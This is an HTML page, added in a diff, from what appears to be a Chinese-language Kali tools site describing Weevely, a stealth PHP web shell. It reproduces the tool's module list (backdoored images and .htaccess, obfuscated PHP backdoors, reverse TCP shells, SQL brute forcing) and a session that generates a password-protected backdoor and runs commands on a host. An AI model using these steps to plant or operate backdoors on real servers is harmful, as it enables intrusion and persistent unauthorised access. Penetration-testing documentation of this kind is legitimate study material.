@@ -1,0 +1,78 @@
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<title>kali工具箱</title>
+<script src="./static/bootstrap.min.js"></script>
+<link rel="stylesheet" href="./static/main.css">
+<link rel="stylesheet" href="./static/bootstrap.min.css">
+<style type="text/css" id="syntaxhighlighteranchor"></style>
+</head>
+<main class="main-container ng-scope" ng-view="">
+<div class="main receptacle post-view ng-scope">
+<article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox="">
+<section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml">
+<h2> Weevely包装说明</h2><p style="text-align: justify;"> Weevely是一个隐形的PHP网页外壳，模拟的telnet类似的连接。它是Web应用程序开发后的一个重要工具，并且可以用作隐形后门或作为网络的外壳，以管理合法的网络账户，甚至免费托管的。 </p><p>资料来源：https://github.com/epinna/Weevely/ <br> <a href="https://github.com/epinna/Weevely/" variation="deepblue" target="blank">Weevely首页</a> | <a href="http://git.kali.org/gitweb/?p=packages/weevely.git;a=summary" variation="deepblue" target="blank">卡利Weevely回购</a> </p><ul><li>作者：Weevely开发商</li><li>许可：GPL第二版</li></ul><h3>包含在weevely包工具</h3><h5> weevely - 隐形的小网站壳</h5><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5e2c31312a1e353f3237">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~# weevely help<br>
++--------------------+------------------------------------------------------+<br>
+| generator          | description                                          |<br>
++--------------------+------------------------------------------------------+<br>
+| :generate.img      | Backdoor existing image and create related .htaccess |<br>
+| :generate.htaccess | Generate backdoored .htaccess                        |<br>
+| :generate.php      | Generate obfuscated PHP backdoor                     |<br>
++--------------------+------------------------------------------------------+<br>
++----------------------+------------------------------------------------------------------------------+<br>
+| module               | description                                                                  |<br>
++----------------------+------------------------------------------------------------------------------+<br>
+| :audit.systemfiles   | Find wrong system files permissions                                          |<br>
+| :audit.userfiles     | Guess files with wrong permissions in users home folders                     |<br>
+| :audit.mapwebfiles   | Crawl and enumerate web folders files permissions                            |<br>
+| :audit.phpconf       | Check php security configurations                                            |<br>
+| :audit.etcpasswd     | Enumerate users and /etc/passwd content                                      |<br>
+| :shell.sh            | Execute system shell command                                                 |<br>
+| :shell.php           | Execute PHP statement                                                        |<br>
+| :system.info         | Collect system informations                                                  |<br>
+| :find.name           | Find files with matching name                                                |<br>
+| :find.perms          | Find files with write, read, execute permissions                             |<br>
+| :find.suidsgid       | Find files with superuser flags                                              |<br>
+| :backdoor.reversetcp | Send reverse TCP shell                                                       |<br>
+| :backdoor.tcp        | Open a shell on TCP port                                                     |<br>
+| :bruteforce.sql      | Bruteforce SQL username                                                      |<br>
+| :bruteforce.sqlusers | Bruteforce all SQL users                                                     |<br>
+| :file.read           | Read remote file                                                             |<br>
+| :file.webdownload    | Download web URL to remote filesystem                                        |<br>
+| :file.mount          | Mount remote filesystem using HTTPfs                                         |<br>
+| :file.enum           | Enumerate remote paths                                                       |<br>
+| :file.upload2web     | Upload binary/ascii file into remote web folders and guess corresponding url |<br>
+| :file.check          | Check remote files type, md5 and permission                                  |<br>
+| :file.rm             | Remove remote files and folders                                              |<br>
+| :file.ls             | List directory contents                                                      |<br>
+| :file.touch          | Change file timestamps                                                       |<br>
+| :file.download       | Download binary/ascii files from the remote filesystem                       |<br>
+| :file.upload         | Upload binary/ascii file into remote filesystem                              |<br>
+| :file.edit           | Edit remote file                                                             |<br>
+| :sql.console         | Run SQL console or execute single queries                                    |<br>
+| :sql.dump            | Get SQL database dump                                                        |<br>
+| :net.ifaces          | Print interfaces addresses                                                   |<br>
+| :net.proxy           | Install and run Proxy to tunnel traffic through target                       |<br>
+| :net.phpproxy        | Install remote PHP proxy                                                     |<br>
+| :net.scan            | Port scan open TCP ports                                                     |<br>
++----------------------+------------------------------------------------------------------------------+<br>
+<br>
+Hint: Run ':help &lt;module&gt;' to print detailed usage informations.</code><h3> weevely用法示例</h3><p>生成一个PHP后门<b><i>（产生）</i></b>与给定的密码<b><i>（s3cr3t）</i></b>的保护。 </p><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="34465b5b40745f55585d">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~# weevely generate s3cr3t<br>
+[generate.php] Backdoor file 'weevely.php' created with password 's3cr3t'</code><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="93e1fcfce7d3f8f2fffa">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~# weevely http://192.168.1.202/weevely.php s3cr3t<br>
+      ________                     __<br>
+     |  |  |  |----.----.-.--.----'  |--.--.<br>
+     |  |  |  | -__| -__| |  | -__|  |  |  |<br>
+     |________|____|____|___/|____|__|___  | v1.1<br>
+                                     |_____|<br>
+              Stealth tiny web shell<br>
+<br>
+[+] Browse filesystem, execute commands or list available modules with ':help'<br>
+[+] Current session: 'sessions/192.168.1.202/weevely.session'<br>
+<br>
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ef989898c28b8e9b8eaf848e8386">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www $ uname<br>
+Linux<br>
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="572020207a33362336173c363b3e">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www $ id<br>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code><div style="display:none">
+<script src="//s11.cnzz.com/z_stat.php?id=1260038378&web_id=1260038378" language="JavaScript"></script>
+</div>
+</main></body></html>
